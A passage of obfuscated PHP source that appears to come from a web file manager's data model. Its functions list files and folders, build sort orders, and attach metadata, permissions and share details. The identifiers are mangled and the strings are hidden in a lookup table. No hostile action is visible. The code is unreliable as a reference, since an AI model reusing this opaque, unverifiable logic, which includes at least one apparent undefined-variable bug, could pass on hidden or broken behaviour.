$ºÚ•íÉÅ; continue; } foreach ($‘ª×ìäš as $ô†Ü¹’Í) { if (!in_array($ô†Ü¹’Í, $“…ÔÈË)) { $áÌÛäò = !1; break; } } if (!$áÌÛäò) { continue; } if (!is_numeric($ºÚ•íÉÅ)) { $üñåš” = $íÀ€’º†[$ºÚ•íÉÅ]; $Ã•Ä¨  = array($É£Ñæ»[32] => $üñåš”[$É£Ñæ»[32]], $É£Ñæ»[87] => $üñåš”[$É£Ñæ»[87]], $É£Ñæ»[33] => $üñåš”[$É£Ñæ»[33]], $É£Ñæ»[90] => array($É£Ñæ»[513] => 1), $É£Ñæ»[234] => !0); if ($üñåš”[$É£Ñæ»[33]] == $É£Ñæ»[232]) { $÷İÄëŞŞ[] = $Ã•Ä¨ ; } if ($üñåš”[$É£Ñæ»[33]] == $É£Ñæ»[78]) { $šÏŸã©Ó[] = $Ã•Ä¨ ; } continue; } $‰’”ÑÛ©[] = $ºÚ•íÉÅ; } if ($‰’”ÑÛ©) { $¨İØòÑæ = $this->listSource(array($É£Ñæ»[503] => array($É£Ñæ»[504], $‰’”ÑÛ©))); } $¨İØòÑæ = $¨İØòÑæ ? $¨İØòÑæ : array($É£Ñæ»[85] => array(), $É£Ñæ»[86] => array()); $¨İØòÑæ[$É£Ñæ»[85]] = array_merge($¨İØòÑæ[$É£Ñæ»[85]], $šÏŸã©Ó); $¨İØòÑæ[$É£Ñæ»[86]] = array_merge($¨İØòÑæ[$É£Ñæ»[86]], $÷İÄëŞŞ); if (isset($¨İØòÑæ[$É£Ñæ»[444]]) && count($‰’”ÑÛ©) == $¨İØòÑæ[$É£Ñæ»[444]][$É£Ñæ»[445]]) { return $¨İØòÑæ; } $ˆÅöù™É = array(); $Å÷¥…‘ = array_to_keyvalue($¨İØòÑæ[$É£Ñæ»[85]], $É£Ñæ»[12], $É£Ñæ»[193]); $Èé¹¾Â = array_to_keyvalue($¨İØòÑæ[$É£Ñæ»[86]], $É£Ñæ»[12], $É£Ñæ»[193]); $×É¸ĞÅõ = array_merge($Èé¹¾Â, $Å÷¥…‘); foreach ($‰’”ÑÛ© as $‹é­ïÑŸ) { if (!in_array($‹é­ïÑŸ, $×É¸ĞÅõ)) { $ˆÅöù™É[] = $‹é­ïÑŸ; } } if ($ˆÅöù™É) { Model($É£Ñæ»[514])->removeBySource($ˆÅöù™É); } return $¨İØòÑæ; } public function listUserRecycle() { $ë±»Ú©ë =& $_SERVER[±Ö‰ô½¯]; $¬‚¯±ûó = Model($ë±»Ú©ë[515])->listData(); if (!$¬‚¯±ûó) { return array(); } $©Öò‡ß = array($ë±»Ú©ë[503] => array($ë±»Ú©ë[504], $¬‚¯±ûó), $ë±»Ú©ë[516] => 1); return $this->listSource($©Öò‡ß); } public function listSource($¯íÓ§‰, $•âÆ´¥… = 3000, $§·×Ì¼½ = false) { $á±¡’¼Ê =& $_SERVER[±Ö‰ô½¯]; if (!isset($¯íÓ§‰[$á±¡’¼Ê[517]])) { $¯íÓ§‰[$á±¡’¼Ê[517]] = 0; } if (isset($¯íÓ§‰[$á±¡’¼Ê[192]]) && $¯íÓ§‰[$á±¡’¼Ê[192]] == $á±¡’¼Ê[230]) { $¯íÓ§‰[$á±¡’¼Ê[498]] = array($á±¡’¼Ê[465], $á±¡’¼Ê[12]); } if (isset($¯íÓ§‰[$á±¡’¼Ê[192]])) { $¯íÓ§‰[$á±¡’¼Ê[192]] = intval($¯íÓ§‰[$á±¡’¼Ê[192]]); } $ıÇŸÏî = $á±¡’¼Ê[518]; $³›‘™Èî = $this->field($ıÇŸÏî)->_makeOrder()->where($¯íÓ§‰)->selectPage($•âÆ´¥…); $this->_listPageCheck($³›‘™Èî, $ıÇŸÏî, $¯íÓ§‰); $this->_listDataApply($³›‘™Èî[$á±¡’¼Ê[447]], $§·×Ì¼½); $this->_listMake($³›‘™Èî); return $³›‘™Èî; } private function _listPageCheck(&$œÒ±Ì½, $À‘¾ŞÒ, $§ğô©Äï) { $ˆó¸şÏÙ =& $_SERVER[±Ö‰ô½¯]; if (!is_array($œÒ±Ì½[$ˆó¸şÏÙ[444]])) { return; } $‘Úœ–ú = $œÒ±Ì½[$ˆó¸şÏÙ[444]]; if ($‘Úœ–ú[$ˆó¸şÏÙ[446]] <= 1) { return; } if ($‘Úœ–ú[$ˆó¸şÏÙ[445]] >= 100000) { return; } if (Model($ˆó¸şÏÙ[519])->get($ˆó¸şÏÙ[520]) != $ˆó¸şÏÙ[521]) { return; } $À‘¾ŞÒ = str_replace(array($ˆó¸şÏÙ[53], $ˆó¸şÏÙ[419], $ˆó¸şÏÙ[287]), $ˆó¸şÏÙ[12], $À‘¾ŞÒ); $À‘¾ŞÒ = $ˆó¸şÏÙ[522] . str_replace($ˆó¸şÏÙ[50], $ˆó¸şÏÙ[523], $À‘¾ŞÒ) . $ˆó¸şÏÙ[524]; $Šº¶’’´ = $ˆó¸şÏÙ[525]; $Šº¶’’´ = $Šº¶’’´ . $ˆó¸şÏÙ[526]; $…Ã™“èÀ = $‘Úœ–ú[$ˆó¸şÏÙ[441]] * ($‘Úœ–ú[$ˆó¸şÏÙ[430]] - 1) . $ˆó¸şÏÙ[50] . $‘Úœ–ú[$ˆó¸şÏÙ[441]]; $îŸ®œÄ = $this->_makeOrder(!0); $¾äËü = $ˆó¸şÏÙ[522] . str_replace($ˆó¸şÏÙ[50], $ˆó¸şÏÙ[523], $îŸ®œÄ[0]); if (strpos($¾äËü, $ˆó¸şÏÙ[527])) { $¾äËü = str_replace($ˆó¸şÏÙ[527], $ˆó¸şÏÙ[528], $¾äËü); } else { $¾äËü .= $ˆó¸şÏÙ[529] . $îŸ®œÄ[1]; } $áñ´™òÄ = array(); foreach ($§ğô©Äï as $ÜñØ†Öã => $ò¹¾Ü“†) { $áñ´™òÄ[$ˆó¸şÏÙ[522] . $ÜñØ†Öã] = $ò¹¾Ü“†; } $this->alias($ˆó¸şÏÙ[530])->field($À‘¾ŞÒ)->limit($…Ã™“èÀ)->order($¾äËü); $€Û¦ŠÛ¯ = $this->join($Šº¶’’´)->where($áñ´™òÄ)->select(); if ($€Û¦ŠÛ¯) { $œÒ±Ì½[$ˆó¸şÏÙ[447]] = $€Û¦ŠÛ¯; } } protected function _makeOrder($Ó›ç¾ = false) { $“¦¤Ï©Í =& $_SERVER[±Ö‰ô½¯]; $ú ùÅŸ… = Model($“¦¤Ï©Í[531])->get($“¦¤Ï©Í[532]); $–õÑˆÅä = Model($“¦¤Ï©Í[531])->get($“¦¤Ï©Í[533]); $É¤§á­˜ = array($“¦¤Ï©Í[534] => $“¦¤Ï©Í[535], $“¦¤Ï©Í[536] => $“¦¤Ï©Í[537]); $µãĞ¸ßë = array($“¦¤Ï©Í[32] => $“¦¤Ï©Í[32], $“¦¤Ï©Í[79] => $“¦¤Ï©Í[79], $“¦¤Ï©Í[168] => $“¦¤Ï©Í[498], $“¦¤Ï©Í[538] => $“¦¤Ï©Í[538], $“¦¤Ï©Í[539] => $“¦¤Ï©Í[540], $“¦¤Ï©Í[233] => $“¦¤Ï©Í[233], $“¦¤Ï©Í[88] => $“¦¤Ï©Í[88]); $åŞ€¨Ê = Input::get($“¦¤Ï©Í[541], $“¦¤Ï©Í[7], $ú ùÅŸ…, array_keys($µãĞ¸ßë)); $äâéîà = Input::get($“¦¤Ï©Í[542], $“¦¤Ï©Í[7], $–õÑˆÅä, array_keys($É¤§á­˜)); if (!in_array($åŞ€¨Ê, array_keys($µãĞ¸ßë))) { $åŞ€¨Ê = $“¦¤Ï©Í[32]; } if (!in_array($äâéîà, array_keys($É¤§á­˜))) { $åŞ€¨Ê = $“¦¤Ï©Í[534]; } if ($åŞ€¨Ê == $“¦¤Ï©Í[32]) { } $â€Ø¾Œ = $“¦¤Ï©Í[543] . $µãĞ¸ßë[$åŞ€¨Ê] . $“¦¤Ï©Í[53] . $É¤§á­˜[$äâéîà]; $â€Ø¾Œ = rtrim(trim($â€Ø¾Œ), $“¦¤Ï©Í[50]); if ($Ó›ç¾) { return array($â€Ø¾Œ, $É¤§á­˜[$äâéîà]); } return $this->order($â€Ø¾Œ); } protected function _listDataApplyItem($ªÖ¤ëà, $ú×ùÍ¹ä = false) { $Á™ü÷¸ø = array($ªÖ¤ëà); $this->_listDataApply($Á™ü÷¸ø, $ú×ùÍ¹ä); return $Á™ü÷¸ø[0]; } protected function _listDataApply(&$•¸Ò«œ, $Ó–èØ¸À = false) { $÷´”™ü =& $_SERVER[±Ö‰ô½¯]; if (!$•¸Ò«œ) { $•¸Ò«œ = array(); return; } $€œ„ü‚Ú = array_to_keyvalue($•¸Ò«œ, $÷´”™ü[12], $÷´”™ü[193]); $€œ„ü‚Ú = array_unique($€œ„ü‚Ú); $€œ„ü‚Ú = array_to_int($€œ„ü‚Ú); $this->_listSourceCache($•¸Ò«œ); if (!$Ó–èØ¸À) { $this->_listAppendMeta($•¸Ò«œ, $€œ„ü‚Ú); $this->_listAppendFileMeta($•¸Ò«œ, $€œ„ü‚Ú); $this->_listAppendChildren($•¸Ò«œ, $€œ„ü‚Ú); } $this->_listAppendPath($•¸Ò«œ); $this->_listAppendAuth($•¸Ò«œ); $this->_listAppendSourceInfo($•¸Ò«œ, $€œ„ü‚Ú); $this->_listAppendUser($•¸Ò«œ); $this->_listFilterInfo($•¸Ò«œ, $Ó–èØ¸À); $this->_listAppendAuthSecret($•¸Ò«œ); } protected function _listSourceCache($ñ¯æíß) { $¯‚œø™× =& $_SERVER[±Ö‰ô½¯]; foreach ($ñ¯æíß as $Â÷ÌÇËÌ) { self::$cacheSourceInfo[$¯‚œø™×[544] . $Â÷ÌÇËÌ[$¯‚œø™×[193]]] = $Â÷ÌÇËÌ; } } protected function _listFilterInfo(&$“€ÏËŠî, $€Ø›ô¥Î = false) { $­…ßÁ =& $_SERVER[±Ö‰ô½¯]; foreach ($“€ÏËŠî as &$¦×ØªŒÃ) { $¦×ØªŒÃ = $this->pathInfoFilter($¦×ØªŒÃ); self::$cachePathInfo[$­…ßÁ[545] . intval($€Ø›ô¥Î) . $­…ßÁ[474] . $¦×ØªŒÃ[$­…ßÁ[193]]] = $¦×ØªŒÃ; } unset($¦×ØªŒÃ); } protected function _listMake(&$ĞÜÂŠÚ») { $Å·½•öË =& $_SERVER[±Ö‰ô½¯]; $ĞÜÂŠÚ»[$Å·½•öË[85]] = array(); $ĞÜÂŠÚ»[$Å·½•öË[86]] = array(); foreach ($ĞÜÂŠÚ»[$Å·½•öË[447]] as $¤âÅÄ£) { $§¡¥ÊĞ = $¤âÅÄ£[$Å·½•öË[497]] == 1 ? $Å·½•öË[85] : $Å·½•öË[86]; $ĞÜÂŠÚ»[$§¡¥ÊĞ][] = $¤âÅÄ£; } unset($ĞÜÂŠÚ»[$Å·½•öË[447]]); } protected function _listAppendMeta(&$¢ıòö¨¹, $œÒÄäŠ) { $¨™¥Ší« =& $_SERVER[±Ö‰ô½¯]; $³êÌÙšì = array($¨™¥Ší«[503] => array($¨™¥Ší«[504], $œÒÄäŠ)); $Ï£â‚‡Ì = Model($¨™¥Ší«[546])->field($¨™¥Ší«[547])->where($³êÌÙšì)->select(); if (!$Ï£â‚‡Ì) { return; } $Áé¾ÕŸ = array($¨™¥Ší«[548], $¨™¥Ší«[549], $¨™¥Ší«[528]); $Ö÷‘ı‘Ï = array(); foreach ($Ï£â‚‡Ì as $œûôŒÏÖ) { if (!isset($Ö÷‘ı‘Ï[$œûôŒÏÖ[$¨™¥Ší«[193]]])) { $Ö÷‘ı‘Ï[$œûôŒÏÖ[$¨™¥Ší«[193]]] = array(); } if (in_array($œûôŒÏÖ[$¨™¥Ší«[95]], $Áé¾ÕŸ)) { continue; } if ($œûôŒÏÖ[$¨™¥Ší«[95]] == $¨™¥Ší«[550]) { $œûôŒÏÖ[$¨™¥Ší«[452]] = $¨™¥Ší«[551]; } $Ö÷‘ı‘Ï[$œûôŒÏÖ[$¨™¥Ší«[193]]][$œûôŒÏÖ[$¨™¥Ší«[95]]] = $œûôŒÏÖ[$¨™¥Ší«[452]]; } foreach ($¢ıòö¨¹ as &$¼¶¸­ö…) { $¼¶¸­ö…[$¨™¥Ší«[552]] = !1; if (isset($Ö÷‘ı‘Ï[$¼¶¸­ö…[$¨™¥Ší«[193]]])) { $¼¶¸­ö…[$¨™¥Ší«[552]] = $Ö÷‘ı‘Ï[$¼¶¸­ö…[$¨™¥Ší«[193]]]; } if ($this->fileIsLock($¼¶¸­ö…) && $¼¶¸­ö…[$¨™¥Ší«[499]]) { $¡æëú…İ = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $¼¶¸­ö…[$¨™¥Ší«[499]][$¨™¥Ší«[500]] = AuthModel::authDisable($¼¶¸­ö…[$¨™¥Ší«[499]][$¨™¥Ší«[500]], $¡æëú…İ); $¼¶¸­ö…[$¨™¥Ší«[499]][$¨™¥Ší«[553]][$¨™¥Ší«[499]] = $¼¶¸­ö…[$¨™¥Ší«[499]][$¨™¥Ší«[500]]; } } unset($¼¶¸­ö…); } protected function _listAppendFileMeta(&$ÖâÕ™Şƒ, $‚üìÊó½) { $Ã®¾ì³¡ =& $_SERVER[±Ö‰ô½¯]; $„Šİæ¾Î = array_to_keyvalue($ÖâÕ™Şƒ, $Ã®¾ì³¡[12], $Ã®¾ì³¡[554]); $„Šİæ¾Î = array_filter(array_unique($„Šİæ¾Î)); $„Šİæ¾Î = array_to_int($„Šİæ¾Î); if (!$„Šİæ¾Î) { return; } $®¼—ù®¶ = array($Ã®¾ì³¡[555] => array($Ã®¾ì³¡[504], $„Šİæ¾Î)); $Ù£¯æˆ¨ = $Ã®¾ì³¡[556]; $¢Ã•‹¬ì = Model($Ã®¾ì³¡[557])->field($Ù£¯æˆ¨)->where($®¼—ù®¶)->select(); $¢Ã•‹¬ì = array_to_keyvalue($¢Ã•‹¬ì, $Ã®¾ì³¡[554]); $¢¯û¯ÌĞ = Model($Ã®¾ì³¡[558])->field($Ã®¾ì³¡[559])->where($®¼—ù®¶)->select(); $¢¯û¯ÌĞ = $¢¯û¯ÌĞ ? $¢¯û¯ÌĞ : array(); $±ß¹°Áú = array(); foreach ($¢¯û¯ÌĞ as $´¿¾ğ‚) { if (!isset($±ß¹°Áú[$´¿¾ğ‚[$Ã®¾ì³¡[554]]])) { $±ß¹°Áú[$´¿¾ğ‚[$Ã®¾ì³¡[554]]] = array(); } $±ß¹°Áú[$´¿¾ğ‚[$Ã®¾ì³¡[554]]][$´¿¾ğ‚[$Ã®¾ì³¡[95]]] = $´¿¾ğ‚[$Ã®¾ì³¡[452]]; } foreach ($ÖâÕ™Şƒ as &$œ“º†ëê) { $õÈ‡î´˜ = $œ“º†ëê[$Ã®¾ì³¡[554]]; if (!$õÈ‡î´˜ || !is_array($¢Ã•‹¬ì[$õÈ‡î´˜])) { continue; } $‹Ã«—° = $¢Ã•‹¬ì[$õÈ‡î´˜]; $‹Ã«—°[$Ã®¾ì³¡[79]] = $œ“º†ëê[$Ã®¾ì³¡[79]]; $‹Ã«—°[$Ã®¾ì³¡[32]] = $œ“º†ëê[$Ã®¾ì³¡[32]]; if (!$‹Ã«—°[$Ã®¾ì³¡[560]]) { Model($Ã®¾ì³¡[557])->fileMd5Check($‹Ã«—°); } if (!isset(self::$cacheFileInfo[$Ã®¾ì³¡[561] . $õÈ‡î´˜])) { self::$cacheFileInfo[$Ã®¾ì³¡[561] . $õÈ‡î´˜] = array_merge(array(), $‹Ã«—°); } unset($¢Ã•‹¬ì[$õÈ‡î´˜][$Ã®¾ì³¡[87]]); $–İëšı¡ = isset($±ß¹°Áú[$õÈ‡î´˜]) && is_array($±ß¹°Áú[$õÈ‡î´˜]) ? $±ß¹°Áú[$õÈ‡î´˜] : array(); $œ“º†ëê[$Ã®¾ì³¡[169]] = array_merge($–İëšı¡, $¢Ã•‹¬ì[$õÈ‡î´˜]); if (isset($œ“º†ëê[$Ã®¾ì³¡[169]][$Ã®¾ì³¡[184]])) { $œ“º†ëê[$Ã®¾ì³¡[184]] = json_decode($œ“º†ëê[$Ã®¾ì³¡[169]][$Ã®¾ì³¡[184]], !0); unset($œ“º†ëê[$Ã®¾ì³¡[169]][$Ã®¾ì³¡[184]]); } } unset($œ“º†ëê); } protected function _listAppendSourceInfo(&$Öİ¬…ğÆ, $“ÆÃ€Ô®) { $¯í×ğâ =& $_SERVER[±Ö‰ô½¯]; $”ÏÕ“¿İ = Model($¯í×ğâ[562])->listData(); $çëÃ”½Ô = Model($¯í×ğâ[511])->listData(); $¸ñÚá­Æ = Model($¯í×ğâ[501])->listData(); $Îî…èü¿ = Model($¯í×ğâ[563])->listSimple(); $­ºÊ‘Ú = array_to_keyvalue($”ÏÕ“¿İ, $¯í×ğâ[484]); $£©´…½ = array_to_keyvalue_group($çëÃ”½Ô, $¯í×ğâ[87], $¯í×ğâ[512]); $‹Ñ¾Â† = array_to_keyvalue($¸ñÚá­Æ, $¯í×ğâ[87]); $„õØ½À× = array_to_keyvalue_group($Îî…èü¿, $¯í×ğâ[193]); foreach ($Öİ¬…ğÆ as &$Éå²åÅğ) { $Éå²åÅğ[$¯í×ğâ[90]] = array($¯í×ğâ[564] => 0, $¯í×ğâ[565] => 0, $¯í×ğâ[566] => 0); if (isset($‹Ñ¾Â†[$Éå²åÅğ[$¯í×ğâ[193]]])) { $Éå²åÅğ[$¯í×ğâ[90]][$¯í×ğâ[567]] = 1; $Éå²åÅğ[$¯í×ğâ[90]][$¯í×ğâ[568]] = $‹Ñ¾Â†[$Éå²åÅğ[$¯í×ğâ[193]]][$¯í×ğâ[32]]; } if ($£©´…½ && $­ºÊ‘Ú && isset($£©´…½[$Éå²åÅğ[$¯í×ğâ[193]]])) { $Éå²åÅğ[$¯í×ğâ[90]][$¯í×ğâ[569]] = array(); foreach ($£©´…½[$Éå²åÅğ[$¯í×ğâ[193]]] as $§È’°) { $®×Œàš = $­ºÊ‘Ú[$§È’°]; $Éå²åÅğ[$¯í×ğâ[90]][$¯í×ğâ[569]][] = array($¯í×ğâ[570] => $®×Œàš[$¯í×ğâ[484]], $¯í×ğâ[506] => $®×Œàš[$¯í×ğâ[32]], $¯í×ğâ[571] => $®×Œàš[$¯í×ğâ[572]]); } } if ($„õØ½À× && isset($„õØ½À×[$Éå²åÅğ[$¯í×ğâ[193]]])) { $Éå²åÅğ[$¯í×ğâ[90]][$¯í×ğâ[573]] = array(); foreach ($„õØ½À×[$Éå²åÅğ[$¯í×ğâ[193]]] as $½í¼Ğõñ) { $Éå²åÅğ[$¯í×ğâ[90]][$¯í×ğâ[573]] = $this->shareFilterShow($½í¼Ğõñ); } } } unset($Éå²åÅğ); return $Öİ¬…ğÆ; } protected function shareFilterShow($•× •îè) { $¬¹ö½§¢ =& $_SERVER[±Ö‰ô½¯]; if (!$•× •îè) { return $•× •îè; } $Üé‡’ĞÜ = $¬¹ö½§¢[574]; if ($•× •îè[$¬¹ö½§¢[575]] == $¬¹ö½§¢[91]) { $Üé‡’ĞÜ .= $¬¹ö½§¢[576]; } if (is_array($•× •îè[$¬¹ö½§¢[577]]) && is_array($•× •îè[$¬¹ö½§¢[577]][$¬¹ö½§¢[578]])) { $•× •îè[$¬¹ö½§¢[577]][$¬¹ö½§¢[578]] = $¬¹ö½§¢[579]; } if (!$‡Ïóáë³[$¬¹ö½§¢[580]] && $‡Ïóáë³[$¬¹ö½§¢[193]] != $¬¹ö½§¢[230]) { $‡Ïóáë³[$¬¹ö½§¢[580]] = KodIO::make($‡Ïóáë³[$¬¹ö½§¢[193]]); } $•× •îè = array_field_key($•× •îè, explode($¬¹ö½§¢[50], $Üé‡’ĞÜ)); return $•× •îè; } protected function _listAppendChildren(&$Ş¢€¢ü, $‘˜ó¾ìó) { $Š®ÆÜ«• =& $_SERVER[±Ö‰ô½¯]; $‡ÕÆ†õ¿ = array(); $åŸïüùŸ = array($Š®ÆÜ«•[241] => 0, $Š®ÆÜ«•[242] => 0); foreach ($Ş¢€¢ü as &$Ã ˆ§Äš) { if (!$Ã ˆ§Äš[$Š®ÆÜ«•[497]]) { continue; } $‡ÕÆ†õ¿[] = intval($Ã ˆ§Äš[$Š®ÆÜ«•[193]]); } unset($Ã ˆ§Äš); if (!$‡ÕÆ†õ¿) { return; } $õœÇØ´° = array($Š®ÆÜ«•[192] => array($Š®ÆÜ«•[7], $‡ÕÆ†õ¿), $Š®ÆÜ«•[517] => 0); $†åÇ…ù¯ = array($Š®ÆÜ«•[192], $Š®ÆÜ«•[497], $Š®ÆÜ«•[581] => $Š®ÆÜ«•[582]); $¥¸²íÔ‹ = $this->field($†åÇ…ù¯)->where($õœÇØ´°)->group($Š®ÆÜ«•[583])->select(); $·§âéõæ = array(); foreach ($¥¸²íÔ‹ as $”à±şæ) { $êé†¦° = $”à±şæ[$Š®ÆÜ«•[192]]; $¨³±ØŸĞ = $”à±şæ[$Š®ÆÜ«•[497]] == $Š®ÆÜ«•[91] ? $Š®ÆÜ«•[242] : $Š®ÆÜ«•[241]; if (!isset($·§âéõæ[$êé†¦°])) { $·§âéõæ[$êé†¦°] = array($Š®ÆÜ«•[241] => 0, $Š®ÆÜ«•[242] => 0); } $·§âéõæ[$êé†¦°][$¨³±ØŸĞ] += $”à±şæ[$Š®ÆÜ«•[582]]; } foreach ($Ş¢€¢ü as &$Ã ˆ§Äš) { if (!$Ã ˆ§Äš[$Š®ÆÜ«•[497]]) { continue; } $€‡ãÌ‰ƒ = is_array($·§âéõæ[$Ã ˆ§Äš[$Š®ÆÜ«•[193]]]) ? $·§âéõæ[$Ã ˆ§Äš[$Š®ÆÜ«•[193]]] : $åŸïüùŸ; $Ã ˆ§Äš[$Š®ÆÜ«•[242]] = $€‡ãÌ‰ƒ[$Š®ÆÜ«•[242]]; $Ã ˆ§Äš[$Š®ÆÜ«•[241]] = $€‡ãÌ‰ƒ[$Š®ÆÜ«•[241]]; unset($Ã ˆ§Äš[$Š®ÆÜ«•[498]]); } unset($Ã ˆ§Äš); } protected function _listAppendAuth(&$®¹ÃŒ…¢) { $Ã®üÊë‘ =& $_SERVER[±Ö‰ô½¯]; $ÏƒÈËÏ  = array(); foreach ($®¹ÃŒ…¢ as $”óÕØÃ) { if ($”óÕØÃ[$Ã®üÊë‘[190]] == self::TYPE_GROUP) { $ÏƒÈËÏ [] = intval($”óÕØÃ[$Ã®üÊë‘[193]]); } } if (!$ÏƒÈËÏ ) { return; } $ßøˆ”ÑÔ = array_to_keyvalue($®¹ÃŒ…¢, $Ã®üÊë‘[193]); $ªŠĞöÂ¸ = Model($Ã®üÊë‘[584])->getSourceList($ÏƒÈËÏ , $ßøˆ”ÑÔ); $ Ò¡¯§ = KodUser::isRoot(); foreach ($®¹ÃŒ…¢ as $è˜íàß­ => &$”óÕØÃ) { $”óÕØÃ[$Ã®üÊë‘[499]] = $ªŠĞöÂ¸[$”óÕØÃ[$Ã®üÊë‘[193]]]; if (!$”óÕØÃ[$Ã®üÊë‘[499]] && $”óÕØÃ[$Ã®üÊë‘[190]] == self::TYPE_GROUP) { $”óÕØÃ[$Ã®üÊë‘[499]] = Action($Ã®üÊë‘[585])->pathGroupAuthMake($”óÕØÃ[$Ã®üÊë‘[586]]); if (!$”óÕØÃ[$Ã®üÊë‘[499]] && !$ Ò¡¯§) { $”óÕØÃ[$Ã®üÊë‘[235]] = !1; $”óÕØÃ[$Ã®üÊë‘[234]] = !1; } } if ($”óÕØÃ[$Ã®üÊë‘[499]]) { $”óÕØÃ[$Ã®üÊë‘[235]] = AuthModel::authCheckEdit($”óÕØÃ[$Ã®üÊë‘[499]][$Ã®üÊë‘[500]]); $”óÕØÃ[$Ã®üÊë‘[234]] = AuthModel::authCheckView($”óÕØÃ[$Ã®üÊë‘[499]][$Ã®üÊë‘[500]]); } $this->groupPathDisplay($”óÕØÃ); } unset($”óÕØÃ); } public function _listAppendAuthSecret(&$’³¿ğ·Ë) { $©•ı…óØ =& $_SERVER[±Ö‰ô½¯]; if (Model($©•ı…óØ[519])->get($©•ı…óØ[587]) != $©•ı…óØ[91]) { return; } static $Ãºš”şï = false; if (!$Ãºš”şï) { $ ·å¥Í” = Model($©•ı…óØ[588]); $Á¦¾•œ¥ = Model($©•ı…óØ[589]); $Ãºš”şï = $Á¦¾•œ¥->listData(); $Ãºš”şï = array_to_keyvalue($Ãºš”şï, $©•ı…óØ[193]); $Ñú­÷Õê = json_decode(Model($©•ı…óØ[519])->get($©•ı…óØ[590]), !0); $Ñú­÷Õê = array_to_keyvalue($Ñú­÷Õê, $©•ı…óØ[484]); foreach ($Ãºš”şï as $ù‚â´Øï => $Ù×ÆºçÕ) { $¸Õ±­àÇ = $Ñú­÷Õê[$Ù×ÆºçÕ[$©•ı…óØ[591]]]; if (!$¸Õ±­àÇ) { $Á¦¾•œ¥->remove($Ù×ÆºçÕ[$©•ı…óØ[484]]); unset($Ãºš”şï[$ù‚â´Øï]); continue; } $íğØÊÓó = $ ·å¥Í”->listData($¸Õ±­àÇ[$©•ı…óØ[499]]); if (!$íğØÊÓó) { $Á¦¾•œ¥->remove($Ù×ÆºçÕ[$©•ı…óØ[484]]); unset($Ãºš”şï[$ù‚â´Øï]); continue; } $Ù×ÆºçÕ[$©•ı…óØ[499]] = $íğØÊÓó; $Ù×ÆºçÕ[$©•ı…óØ[592]] = $¸Õ±­àÇ; $Ù×ÆºçÕ[$©•ı…óØ[593]] = Model($©•ı…óØ[594])->getInfoSimpleOuter($Ù×ÆºçÕ[$©•ı…óØ[538]]); $Ãºš”şï[$ù‚â´Øï] = $Ù×ÆºçÕ; } } $¦‰µì˜© = USER_ID; $äŸƒ¾¶‹ = array(); $€“…·ÔÄ = $this->_listAppendPath($äŸƒ¾¶‹, !0); foreach ($’³¿ğ·Ë as $ù‚â´Øï => &$Ù×ÆºçÕ) { if (!is_array($Ù×ÆºçÕ[$©•ı…óØ[499]])) { continue; } if ($Ù×ÆºçÕ[$©•ı…óØ[190]] != $©•ı…óØ[595]) { continue; } if (isset($Ãºš”şï[$Ù×ÆºçÕ[$©•ı…óØ[193]]])) { $•÷à•Ï = $Ãºš”şï[$Ù×ÆºçÕ[$©•ı…óØ[193]]]; if (!is_array($Ù×ÆºçÕ[$©•ı…óØ[552]])) { $Ù×ÆºçÕ[$©•ı…óØ[552]] = array(); } $Ù×ÆºçÕ[$©•ı…óØ[552]][$©•ı…óØ[596]] = $•÷à•Ï[$©•ı…óØ[591]]; $Ù×ÆºçÕ[$©•ı…óØ[499]][$©•ı…óØ[597]] = $•÷à•Ï; $Ù×ÆºçÕ[$©•ı…óØ[499]][$©•ı…óØ[598]] = $Ù×ÆºçÕ[$©•ı…óØ[599]]; $Ù×ÆºçÕ[$©•ı…óØ[499]][$©•ı…óØ[600]] = $©•ı…óØ[91]; if ($•÷à•Ï[$©•ı…óØ[538]] != $¦‰µì˜©) { $Ù×ÆºçÕ[$©•ı…óØ[499]][$©•ı…óØ[500]] = $Ù×ÆºçÕ[$©•ı…óØ[499]][$©•ı…óØ[500]] & $•÷à•Ï[$©•ı…óØ[499]][$©•ı…óØ[499]]; } continue; } $¹’¨óæ = $this->parentLevelArray($Ù×ÆºçÕ[$©•ı…óØ[601]]); $õäáÃ” = array_reverse($¹’¨óæ); foreach ($õäáÃ” as $“¥»ºİ => $ö‡àÂ‡’) { if (!isset($Ãºš”şï[$ö‡àÂ‡’])) { continue; } $•÷à•Ï = $Ãºš”şï[$ö‡àÂ‡’]; $Ù×ÆºçÕ[$©•ı…óØ[499]][$©•ı…óØ[597]] = $•÷à•Ï; if ($•÷à•Ï[$©•ı…óØ[538]] != $¦‰µì˜©) { $Ù×ÆºçÕ[$©•ı…óØ[499]][$©•ı…óØ[500]] = $Ù×ÆºçÕ[$©•ı…óØ[499]][$©•ı…óØ[500]] & $•÷à•Ï[$©•ı…óØ[499]][$©•ı…óØ[499]]; } $·òÌéú¬ = $©•ı…óØ[12]; $½ôê““­ = count($¹’¨óæ) - $“¥»ºİ; for ($‡‰ÜÙÒ¾ = 0; $‡‰ÜÙÒ¾ < $½ôê““­; $‡‰ÜÙÒ¾++) { if (!isset($€“…·ÔÄ[$¹’¨óæ[$‡‰ÜÙÒ¾]])) { $·òÌéú¬ = $©•ı…óØ[12]; break; } $·òÌéú¬ = $·òÌéú¬ . rtrim($€“…·ÔÄ[$¹’¨óæ[$‡‰ÜÙÒ¾]], $©•ı…óØ[8]) . $©•ı…óØ[8]; } $Ù×ÆºçÕ[$©•ı…óØ[499]][$©•ı…óØ[598]] = rtrim($·òÌéú¬, $©•ı…óØ[8]) . $©•ı…óØ[8]; break; } } unset($Ù×ÆºçÕ); } public function groupPathDisplay(&$Ñùš ÙÍ) { $¹ „ˆ¾ =& $_SERVER[±Ö‰ô½¯]; if ($Ñùš ÙÍ[$¹ „ˆ¾[190]] != self::TYPE_GROUP) { return; } $‰ÈÍå—È = Model($¹ „ˆ¾[602])->getInfo($Ñùš ÙÍ[$¹ „ˆ¾[586]]); $ëØÑ²Ï = $this->parentLevelArray($‰ÈÍå—È[$¹ „ˆ¾[601]]); $š£ğÌ€ö = $¹ „ˆ¾[12]; foreach ($ëØÑ²Ï as $¬ğ¤¯Ñ) { $¢òÓ™È¤ = Model($¹ „ˆ¾[602])->getInfo($¬ğ¤¯Ñ); $š£ğÌ€ö .= $¢òÓ™È¤[$¹ „ˆ¾[90]][$¹ „ˆ¾[193]] . $¹ „ˆ¾[50]; } $Ñùš ÙÍ[$¹ „ˆ¾[603]] = $‰ÈÍå—È[$¹ „ˆ¾[192]]; $Ñùš ÙÍ[$¹ „ˆ¾[604]] = $‰ÈÍå—È[$¹ „ˆ¾[601]]; $Ñùš ÙÍ[$¹ „ˆ¾[605]] = $‰ÈÍå—È[$¹ „ˆ¾[606]]; $Ñùš 